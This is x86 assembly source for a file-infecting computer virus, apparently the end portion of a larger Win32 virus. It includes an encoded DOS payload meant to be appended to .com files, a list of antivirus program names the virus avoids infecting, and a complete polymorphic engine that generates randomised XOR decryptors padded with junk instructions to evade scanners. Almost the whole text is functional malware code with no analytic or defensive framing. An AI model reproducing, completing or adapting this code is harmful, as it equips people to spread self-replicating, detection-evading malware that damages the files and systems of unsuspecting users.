;this sweet code will be appended to .com files (234 / 0eah bytes large)

dospayload      label   byte
        db      0e8h,09h,00h,0ebh,012h,08bh,0ech,083h,0c4h,020h,0ebh,04h,0ebh
        db      0fch,0cdh,021h,0e8h,02ch,00h,0ebh,0eeh,0e2h,0f9h,058h,08bh
        db      0ech,02dh,03h,01h,0fbh,095h,0b4h,04ch,080h,0ech,022h,0cdh,021h
        db      080h,0feh,07h,075h,05h,080h,0fah,07h,074h,017h,0beh,0eah,01h
        db      03h,0f5h,0bfh,00h,01h,0a5h,0a5h,0b8h,00h,01h,050h,0c3h,0ebh
        db      05h,0b8h,00h,04ch,0cdh,021h,0c3h,0beh,058h,01h,03h,0f5h,08bh
        db      0feh,0b9h,092h,00h,0fch,0ach,0f6h,0d8h,0aah,0e2h,0fah,018h
        db      07dh,00h,098h,00h,048h,0f9h,047h,0f6h,00h,018h,08dh,00h,042h
        db      070h,0ffh,0fdh,0bh,018h,0a8h,00h,018h,0abh,00h,047h,0d4h,0ffh
        db      018h,09eh,00h,018h,0b4h,00h,06h,015h,02h,0a0h,04ch,0d4h,033h
        db      0dfh,076h,026h,04ch,0d4h,033h,0dfh,0d6h,02dh,080h,06h,0ech
        db      08eh,0bh,09fh,03dh,0a9h,09fh,095h,09bh,0e0h,08bh,090h,0d4h
        db      0e0h,0b2h,09bh,091h,0d2h,0d2h,0d2h,00h,0ach,098h,09bh,0e0h
        db      0b3h,09fh,08ch,08eh,097h,088h,0e0h,098h,09fh,08dh,0e0h,087h
        db      091h,08bh,0d2h,0d2h,0d2h,00h,089h,0c7h,088h,0d2h,093h,0bfh
        db      0ach,0aeh,097h,0a8h,0e0h,0adh,0aah,0a8h,00h,018h,0eah,00h,0cdh
        db      01h,04ch,0f6h,054h,055h,018h,055h,01h,0f6h,040h,08bh,09h,047h
        db      0e2h,00h,018h,05fh,01h,01eh,05h,03dh,048h,0fdh,00h,033h,0f0h
        db      04ch,0ffh,04bh,0e0h,033h,0f0h,03dh
first4bts       dd      ?       ;the first 4 overwritten bytes from the host
dospayloadsize  equ $-offset dospayload

badnames        label byte
        db      04h,"_AVP"                      ;_AVP files
        db      03h,"NAV"                       ;Norton AV
        db      02h,"TB"                        ;Tbscan, Tbav32, whole shit
        db      02h,"F-"                        ;F-Prot
        db      03h,"PAV"                       ;Panda AV
        db      03h,"DRW"                       ;Doc. Web
        db      04h,"DSAV"                      ;Doc. Salomon
        db      03h,"NOD"                       ;NodIce
        db      03h,"SCA"                       ;SCAN
        db      05h,"NUKEN"                     ;Nukenabber? (error with infecting)
        db      04h,"YAPS"                      ;YetAnotherPortScanner (selfcheck)
        db      03h,"HL."                       ;HalfLife (thx to Ghostie!)
        db      04h,"MIRC"                      ;mIRC = strange
        db      0h

;--------------------------------------------------------------------------
;       * Checks the name of the file to be infected
;--------------------------------------------------------------------------

checkname:                                      ;check for some bad names
        pushad

        mov     ebp,edi                         ;delta
        mov     edi,esi                         ;points to filename

        mov     al,'.'
        cld
        scasb                   ;search from left to right for the dot
        jne     $-1

        std
        mov     al,'\'          ;search from right to left for the \
        scasb
        jne     $-1

        inc     edi             ;edi pointed to char before \
        inc     edi             ;edi pointed to \

        cld

        lea     esi,[offset badnames+ebp-start]

checkname2:
        xor     eax,eax                         ;for load AL
        lodsb                                   ;size of string in al
        or      al,al
        jz      didit
        mov     ecx,eax                         ;counter for bytes
        push    edi                             ;save pointer to filename
rep     cmpsb                                   ;compare stringbyte
        pop     edi
        jz      ArghItIsAshitFile
        add     esi,ecx
        jmp     checkname2

ArghItIsAshitFile:
        popad
        stc
        ret
didit:
        popad
        clc
        ret
;--------------------------------------------------------------------------


;--------------------------------------------------------------------------
;       *** POLYMORFIC engine which generates decrypter & encrypts code ***
;--------------------------------------------------------------------------


;
; The generated code will look like this:
;
; pushad
; lea RegUsedAsPointer,[eax+placewherecryptedcodestarts]
; mov keyregister,randomvalue
; sub keyregister,randomvalue
; mov counterreg,size
; again:
; mov tempregister,[RegUsedAsPointer]
; xor tempregister,keyregister
; mov [RegUsedAsPointer],tempregister
; add RegUsedAsPointer,4
; dec counterreg
; pushf
; popf
; jz  exit
; jmp again
; exit:
;
;
; between each instruction some random code is putted.

polysz  equ     offset polyend - offset encrypt
encrypt:
        push    eax
        push    ebx
        push    edx
        push    esi
        push    edi

        lea     edi,[offset viruscopy+ebp-start]        ;edi points to buffer        

        call    gengarbage

        ;--------PUSHAD--
        mov     al,60h                  ;pushad
        stosb
        ;--------MOV-----

        call    gengarbage

getregforoffset:                ;This reg will contain the offset of code
        call    getrndal
        cmp     al,4                    ;do not use ESP
        je      getregforoffset
        cmp     al,5                    ;do not use EBP (!)
        je      getregforoffset

        mov     ch,al                   ;backup register for offset code



        ;--LEA reg,[EAX+x]-             ;lea
        shl     al,3
        mov     ah,08dh
        xchg    ah,al
        add     ah,080h
        push    edi                     ;save location for patch
        stosw
        stosd                           ;doesn't matter what we store
        ;------------------
        

        call    gengarbage
      

getregforkey:                           ;This reg will contain the crypt key
        call    getrndal
        cmp     al,4                    ;do not use ESP
        je      getregforkey
        cmp     al,1                    ;do not use ECX
        je      getregforkey
        cmp     al,ch
        je      getregforkey

        mov     cl,al                   ;backup register

        call    gengarbage

        ;--------MOV-----
        add     al,0b8h                 ;make a MOV reg, rndvalue
        stosb
        call    get_rnd32
        stosd
        ;----------------

        mov     ebx,eax                 ;backup key
        mov     ah,cl                   ;register back in ah

        call    gengarbage

        ;--------SUB-----
        mov     al,081h                 ;make a SUB reg, rndvalue
        add     ah,0e8h
        stosw
        call    get_rnd32
        stosd
        ;----------------


        sub     ebx,eax                         ;Save the cryptkey

        
getregforsize:
        call    getrndal
        cmp     al,4                    ;do not use ESP
        je      getregforsize
        cmp     al,cl                   ;nor keyreg
        je      getregforsize
        cmp     al,ch                   ;nor offsetreg
        je      getregforsize

        mov     dh,al


        call    gengarbage

        ;----MOVSIZE-----               ;mov ecx,virussize (size to decrypt)
        add     al,0b8h
        stosb
        mov     eax,virusz/4
        stosd
        ;----------------


        ;***    AT THIS POINT IS EDI THE OFFSET FOR THE JMP     ***

        mov     esi,edi


        ;8b + 00, eax=3,[eax=0]        ch = reg2


getregtoxor:            ;This reg will contain crypted code and'll be xored
        call    getrndal
        cmp     al,4                    ;do not use ESP
        je      getregtoxor
        cmp     al,cl
        je      getregtoxor             ;do not use the keyreg
        cmp     al,ch
        je      getregtoxor             ;do not use the offset reg
        cmp     al,dh
        je      getregtoxor


        mov     dl,al


        call    gengarbage


        ;-MOV REG3,[REG2]      ;make a mov reg3,[reg2] reg2=offset code
        shl     al,3
        or      al,ch
        mov     ah,08bh
        xchg    al,ah
        stosw
        ;----------------


        call    gengarbage


        ;-XOR REG3,REG1--       ;make a xor reg3,reg1 reg1=key
        mov     al,dl
        shl     al,3
        or      al,cl
        add     al,0c0h
        mov     ah,33h
        xchg    al,ah
        stosw
        ;----------------


        call    gengarbage


        mov     al,dl

        ;-MOV [REG2],REG3       ;make a mov [reg2],reg3 reg2=offset code 
        shl     al,3
        or      al,ch
        mov     ah,089h
        xchg    al,ah
        stosw
        ;----------------


        call    gengarbage


        ;-ADD REG2,4-----       ;adds 4 to the offset register
        mov     al,83h
        stosb
        mov     ax,004c0h
        add     al,ch
        stosw
        ;----------------


        call    gengarbage


        ;---DEC REG4-----       ;decreases counter reg4 (size)
        mov     al,dh
        add     al,048h
        stosb
        ;----------------

        mov     eax,9c66h       ;pushf
        stosw


        call    gengarbage

        inc     ah              ;popf
        stosw


        ;---JZ OVER------
        mov     ax,074h
        stosw
        push    edi
        ;----------------


        mov     eax,edi         ;can't generate > 80h-5 bytes of garbage 
regenerate:                     ;between JZ beh - poly - JMP - beh: code...
        mov     edi,eax         ;restore EDI for ja 
        
        call    gengarbage

        mov     edx,edi
        sub     edx,eax
        cmp     edx,080h-5      ;80h = max JZ distance, 5 is size of JMP BACK
        ja      regenerate      


        ;----JMP BACK----
        sub     esi,edi
        mov     al,0e9h
        stosb
        mov     eax,0fffffffbh
        add     eax,esi
        stosd
        ;----------------



        ;----PATCH JZ----
        pop     esi             ;esi-1 = jz value

        mov     eax,edi
        sub     eax,esi
        mov     byte ptr [esi-1],al

        ;----------------

        call    gengarbage


        ;----POPAD-------
        mov     al,61h                  ;popad
        stosb
        ;----------------


        call    gengarbage


        ;----PATCH LEA---        
        pop     esi                     ;patch LEA reg1,[EAX+startofcrypted]
        push    edi
        sub     edi,offset viruscopy-start
        sub     edi,ebp
        mov     dword ptr [esi+2],edi
        pop     edi
        ;----------------


        mov     ecx,virusz/4            ;copy encrypted virus code after poly
        mov     esi,ebp                 ;decryptors
cryptit:
        lodsd
        xor     eax,ebx
        stosd
        loop    cryptit

        sub     edi,offset viruscopy-start
        sub     edi,ebp
        mov     ecx,edi                         ;virus size + poly in ECX

        pop     edi
        pop     esi
        pop     edx
        pop     ebx
        pop     eax
        ret


;----------------------------------------------------------------------------;
;       Generates lot of rnd instructions which look good but do nothing
;       (they undo themself indirect)
;----------------------------------------------------------------------------;

gengarbage:
        push    eax
        push    ebx
        push    ecx
        push    edx
        push    esi

garbageloop:

        call    get_rnd32

        and     al,1111b

        cmp     al,1
        je      genadd                  ;OK

        cmp     al,2
        je      gensub                  ;OK

        cmp     al,3
        je      genxor                  ;OK

        cmp     al,4
        je      genmov                  ;OK

        cmp     al,5
        je      genpush                 ;OK

        cmp     al,6
        je      geninc                  ;OK

        cmp     al,7
        je      gendec                  ;OK

        cmp     al,8
        je      gencmp                  ;OK

        cmp     al,9
        je      genjunk                 ;OK

        cmp     al,0eh
        jb      garbageloop

exitgen:

        pop     esi
        pop     edx
        pop     ecx
        pop     ebx
        pop     eax

        ret

;-----------------------------------------------------------------------------
;       Generates random add
;-----------------------------------------------------------------------------
genadd:
        call    getrndal

        cmp     al,4
        je      genadd                          ;4 = esp, leave him alone

        cmp     ah,80h
        jb      addandsub                       ;generate an add - code - sub

        and     eax,111b

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetoadd                               ;yep

        call    pushregister

        call    gengarbage

        call    randomadd                       ;adds a value or register

        call    gengarbage

        call    popregister

        jmp     exitgen

savetoadd:
        call    randomadd

        jmp     exitgen

addandsub:
        push    eax

        xchg    al,ah
        mov     al,081h
        add     ah,0c0h

        stosw
        push    eax

        call    get_rnd32
        stosd
        push    eax

        call    gengarbage

        pop     ebx
        pop     eax

        add     ah,028h
        stosw
        mov     eax,ebx
        stosd

        pop     eax
        jmp     exitgen
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random sub
;-----------------------------------------------------------------------------
gensub:
        call    getrndal

        cmp     al,4
        je      gensub                          ;4 = esp, leave him alone

        cmp     ah,80h
        jb      subandadd                       ;generate an add - code - sub

        and     eax,111b

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetosub                               ;yep

        call    pushregister

        call    gengarbage

        call    randomsub                       ;adds a value or register

        call    gengarbage

        call    popregister

        jmp     exitgen

savetosub:

        call    randomsub

        jmp     exitgen

subandadd:

        push    eax

        xchg    al,ah
        mov     al,081h
        add     ah,0e8h

        stosw
        push    eax

        call    get_rnd32
        stosd
        push    eax

        call    gengarbage

        pop     ebx
        pop     eax

        sub     ah,028h
        stosw
        mov     eax,ebx
        stosd

        pop     eax

        jmp     exitgen
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random xor
;-----------------------------------------------------------------------------
genxor:
        call    getrndal

        cmp     al,4
        je      genxor

        cmp     ah,80h
        jb      genxorxor                       ;generate an xor - code - xor

        and     eax,111b

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetoxor                               ;yep

        call    pushregister                    ;first push

        call    gengarbage                      ;generate some garbage

        call    randomxor                       ;xors with a value or register

        call    gengarbage                      ;generate some garbage

        call    popregister                     ;and pop it

        jmp     exitgen

savetoxor:

        call    randomxor

        jmp     exitgen

genxorxor:
        push    eax

        xchg    al,ah
        add     ah,0f0h
        mov     al,081h

        stosw
        push    eax

        call    get_rnd32
        stosd
        push    eax

        call    gengarbage

        pop     ebx
        pop     eax

        stosw

        mov     eax,ebx

        stosd

        pop     eax
        jmp     exitgen

;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random mov
;-----------------------------------------------------------------------------
genmov:
        call    getrndal

        cmp     al,4
        je      genmov

        and     eax,111b                        ; eax <- al

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetomov                               ;yep

        call    pushregister                    ;first push

        call    gengarbage                      ;generate some garbage

        call    randommov                       ;movs a value or register

        call    gengarbage                      ;generate some garbage

        call    popregister                     ;and pop it

        jmp     exitgen

savetomov:

        call    randommov

        jmp     exitgen
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random push
;-----------------------------------------------------------------------------
genpush:
        call    getrndal
        cmp     al,4
        je      genpush

        and     eax,111b

        call    pushregister

        call    gengarbage

        call    popregister

        jmp     exitgen
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random inc
;-----------------------------------------------------------------------------
geninc:                                         ;40
        call    getrndal
        cmp     al,4
        je      geninc

        cmp     ah,80h
        ja      genincdec

        and     eax,111b

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetoinc

        call    pushregister

        call    gengarbage

        add     al,040h
        stosb

        call    gengarbage

        sub     al,040h

        call    popregister

        jmp     exitgen

savetoinc:
        add     al,040h
        stosb
        jmp     exitgen

genincdec:
        add     al,40h                          ;inc
        stosb

        call    gengarbage

        add     al,8                            ;dec
        stosb

        jmp     exitgen


;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random dec
;-----------------------------------------------------------------------------
gendec:                                         ;48
        call    getrndal
        cmp     al,4
        je      gendec

        cmp     ah,80h
        ja      gendecinc

        and     eax,111b

        cmp     byte ptr [ebp+offset pushtable+eax-start],0h  ;is the reg. pushed?
        ja      savetodec

        call    pushregister

        call    gengarbage

        add     al,048h
        stosb

        call    gengarbage

        sub     al,048h

        call    popregister

        jmp     exitgen

savetodec:
        add     al,048h
        stosb
        jmp     exitgen

gendecinc:
        add     al,48h
        stosb

        call    gengarbage

        sub     al,8h
        stosb
        jmp     exitgen

;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Pushes register in al
;-----------------------------------------------------------------------------
pushregister:
        push    eax

        inc     byte ptr [ebp+offset pushtable+eax-start]     ;set flag for reg.

        add     al,050h
        stosb
        
        pop     eax
        ret
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Pops register in al
;-----------------------------------------------------------------------------
popregister:
        push    eax

        dec     byte ptr [ebp+offset pushtable+eax-start]     ;unflag for reg.

        add     al,058h
        stosb

        pop     eax
        ret
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random add reg, value or add reg1,reg2 - reg = al
;-----------------------------------------------------------------------------
randomadd:
        push    eax

        call    get_rnd32

        cmp     al,80h
        pop     eax
        push    eax
        ja      addregreg

        call    randomaddvalue

rndaddb:
        pop     eax
        ret

addregreg:
        call    randomaddreg
        jmp     rndaddb

;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates random add reg,value - reg = al
;-----------------------------------------------------------------------------


;           81 c0+reg value
; reg = eax 05 value

randomaddvalue:
        push    eax

        or      al,al                                   ;reg = eax?
        jz      addeax                                  ;special

        xchg    al,ah
        mov     al,081h
        add     ah,0c0h

        stosw

backfromaddeax:

        call    get_rnd32

        stosd

        pop     eax
        ret

addeax:

        mov     al,05h
        stosb
        jmp     backfromaddeax

;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random add reg1,reg2 - reg1 = al 
;-----------------------------------------------------------------------------
randomaddreg:
        push    eax

        mov     bl,al

        call    getrndal

        shl     bl,3

        or      al,bl                                   ;mix instructions
        
        add     al,0c0h
        mov     ah,03h
        xchg    ah,al

        stosw

        pop     eax
        ret
;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates random sub reg, value or sub reg1,reg2 - reg = al
;-----------------------------------------------------------------------------
randomsub:

        push    eax

        call    get_rnd32

        cmp     al,80h
        pop     eax
        push    eax
        ja      subregreg

        call    randomsubvalue

rndsubb:
        pop     eax
        ret

subregreg:
        call    randomsubreg
        jmp     rndsubb

;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates random sub reg,value - reg = al
;-----------------------------------------------------------------------------


;           81 c0+reg value
; reg = eax 05 value

randomsubvalue:
        push    eax

        or      al,al                                   ;reg = eax?
        jz      subeax                                  ;special

        xchg    al,ah
        mov     al,081h
        add     ah,0e8h

        stosw

backfromsubeax:

        call    get_rnd32

        stosd

        pop     eax
        ret

subeax:

        mov     al,05h
        stosb
        jmp     backfromsubeax

;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates random sub reg1,reg2 - reg1 = al 
;-----------------------------------------------------------------------------
randomsubreg:
        push    eax

        mov     bl,al

        call    getrndal

        shl     bl,3

        or      al,bl                                   ;mix instructions
        
        add     al,0c0h
        mov     ah,03h
        xchg    ah,al

        stosw

        pop     eax
        ret
;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates a xor reg, value or xor reg, reg2 - reg = al
;-----------------------------------------------------------------------------
randomxor:

        push    eax
        call    get_rnd32
        cmp     al,80h
        pop     eax
        push    eax
        ja      xorvalue

        call    randomxorreg

rndxorr:

        pop     eax
        ret

xorvalue:

        call    randomxorvalue
        jmp     rndxorr
;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates a random xor reg,reg2 - reg = al
;-----------------------------------------------------------------------------
randomxorreg:
        push    eax                                     ;6633

        mov     bl,al

        call    getrndal

        shl     bl,3

        or      al,bl                                   ;mix instructions

        add     al,0c0h
        mov     ah,033h

        xchg    ah,al

        stosw

        pop     eax
        ret
;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generates a random xor reg,value
;-----------------------------------------------------------------------------
randomxorvalue:
        push    eax

        add     al,0f0h
        mov     ah,081h
        
        xchg    al,ah

        stosw

        call    get_rnd32

        stosd

        pop     eax
        ret
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       generates a random mov reg,value or reg,reg2
;-----------------------------------------------------------------------------
randommov:
        push    eax

        cmp     ah,080h
        jb      movreg

        call    randommovvalue

movback:

        pop     eax
        ret

movreg:
        call    randommovreg
        jmp     movback
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;       Generates a random mov reg,value
;-----------------------------------------------------------------------------
randommovvalue:
        push    eax

        add     al,0b8h

        stosb

        call    get_rnd32

        stosd

        pop     eax
        ret

;-----------------------------------------------------------------------------
;       generates a random mov reg,reg2
;-----------------------------------------------------------------------------
randommovreg:                                   ;8b (c0+reg) or reg2
        push    eax
        mov     bl,al

        call    getrndal

        shl     bl,3

        or      al,bl                                   ;mix instructions

        xchg    ah,al

        mov     al,08bh
        add     ah,0c0h

        stosw

        pop     eax
        ret

;-----------------------------------------------------------------------------
;       generates a random cmp reg,reg2 or cmp reg,value
;-----------------------------------------------------------------------------
gencmp:                                    ;39/3b
        call    get_rnd32

        cmp     ah,0c0h
        jb      gencmp

        cmp     al,80h
        ja      gencmpvalue

        push    eax

        call    get_rnd32
        mov     bh,039h
        cmp     al,80h
        ja      gencmp1
        add     bh,2
gencmp1:

        pop     eax

        mov     al,bh

        cld
        stosw
        jmp     exitgen

gencmpvalue:                            ;81f8

        and     eax,0111b
        add     ax,081f8h

        xchg    al,ah

        stosw

        call    get_rnd32

        stosd
        jmp     exitgen
        

;-----------------------------------------------------------------------------


;-----------------------------------------------------------------------------
;       Generate junk   f8 - fd
;-----------------------------------------------------------------------------
genjunk:
        call    get_rnd32
        cmp     al,0f8h
        jb      genjunk
        cmp     al,0fdh
        ja      genjunk

        stosb

        jmp     exitgen
;-----------------------------------------------------------------------------





getrndal:
        call    get_rnd32
        and     al,111b
        ret


rdtcs   equ     <dw 310Fh>

get_rnd32:                                      ;main part by GriYo / 29A
        push    ecx
        push    ebx
        push    edx
        push    edi
        push    esi

        mov     eax,dword ptr [ebp+rnd32_seed-start]
        mov     ecx,eax
        imul    eax,41C64E6Dh
        add     eax,00003039h
        mov     dword ptr [ebp+rnd32_seed-start],eax

        xchg    eax,ecx
        rdtcs                                   ;just 4 some xtra randomness
        xchg    eax,ecx
        xor     eax,ecx
        
        pop     esi
        pop     edi
        pop     edx
        pop     ebx
        pop     ecx
        ret

polyend:

db      "(c)"                           ;just some junk

end:

;----------------------------------------------------------------------------;



pointertope     dd      ?

if debug eq 1
death           dd      ?               ;kill ourself flag
endif

busy            dd      ?
filename        db      100h dup (0h)
peheader        db      1024 dup (0h)
whereappend     dd      ?
pushtable       db      8 dup (0h)

viruscopy       db      (virusz+1000) dup (0h)  ;virussize + poly

memend:

_CODE   ends

;----------------------------------------------------------------------------;

;----------------------------------------------------------------------------;
_DATA   segment dword use32 public 'DATA'
fill    db      ?
_DATA   ends
_burp   segment dword use32 public 'LiFEwiRE'
fill2   db      ?
_burp   ends
;----------------------------------------------------------------------------;

end     start
end
